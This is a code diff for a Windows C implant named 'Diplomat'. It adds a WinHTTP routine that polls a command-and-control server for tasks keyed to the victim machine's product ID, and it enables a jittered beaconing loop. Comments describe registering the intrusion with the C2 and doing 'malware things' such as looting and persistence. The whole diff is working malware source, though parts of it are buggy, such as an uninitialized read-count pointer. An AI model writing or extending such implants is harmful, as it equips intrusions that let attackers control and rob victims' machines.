@@ -186,7 +186,76 @@ void RegisterC2(){
 
 // Contact C2 and get commands to run
 wchar_t* GetTasks(){
+    HINTERNET session = WinHttpOpen(
+        L"Diplomat", 
+        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, 
+        WINHTTP_NO_PROXY_NAME, 
+        WINHTTP_NO_PROXY_BYPASS, 
+        0
+    );
 
+    if (session)
+    {
+        HINTERNET connection = WinHttpConnect(
+            session, 
+            L"127.0.0.1", 
+            5000, 
+            0
+        );
+        
+        if (connection) {
+            wchar_t* buffer = (wchar_t*)malloc(1024);
+            wchar_t* pid = ProductID();
+            swprintf(buffer, 1024/sizeof(wchar_t), L"/tasks/%s", pid);
+
+            HINTERNET request = WinHttpOpenRequest(
+                connection,
+                L"GET",
+                buffer,
+                L"HTTP/1.1",
+                WINHTTP_NO_REFERER,
+                WINHTTP_DEFAULT_ACCEPT_TYPES,
+                0
+            );
+            
+            if(request){
+                BOOL result = WinHttpSendRequest(
+                    request, 
+                    WINHTTP_NO_ADDITIONAL_HEADERS,
+                    -1,
+                    WINHTTP_NO_REQUEST_DATA,
+                    0,
+                    0,
+                    (DWORD_PTR)NULL
+                );
+                
+                if(result){
+                    result = WinHttpReceiveResponse(request, NULL);
+                }
+                DWORD responseSize;
+                if(result){
+                    result = WinHttpQueryDataAvailable(request, &responseSize);
+                }
+                if(result){
+                    // Handle response
+                    wchar_t* response = (wchar_t*)malloc(1024);
+                    LPDWORD bytesRead;
+                    if(WinHttpReadData(request, response, responseSize, bytesRead)){
+                        return response;
+                    }
+                }
+            }else{
+                printf("%d\n", GetLastError());
+            }
+            WinHttpCloseHandle(request);
+        }else{
+            printf("%d\n", GetLastError());
+        }
+        WinHttpCloseHandle(connection);
+    }else{
+        printf("%d\n", GetLastError());
+    }
+    WinHttpCloseHandle(session);
 }
 
 int _tmain(int argc, _TCHAR *argv[]){
@@ -194,13 +263,15 @@ int _tmain(int argc, _TCHAR *argv[]){
     if(argc == 1){
         // Report intrusion to C2
         RegisterC2();
-
-        /*while(1){
+        
+        // Periodically check for new commands from C2
+        while(1){
             wchar_t* tasks = GetTasks();
-            
-            int jitter = (rand() % 20) - 10;
-            Sleep(30+jitter);
-        }*/
+            wprintf(L"%s\n", tasks);
+
+            int jitter = (rand() % 20000) - 10000;
+            Sleep(30000+jitter);
+        }
     }
 
     // Do malware things (investigation, looting, persistence)
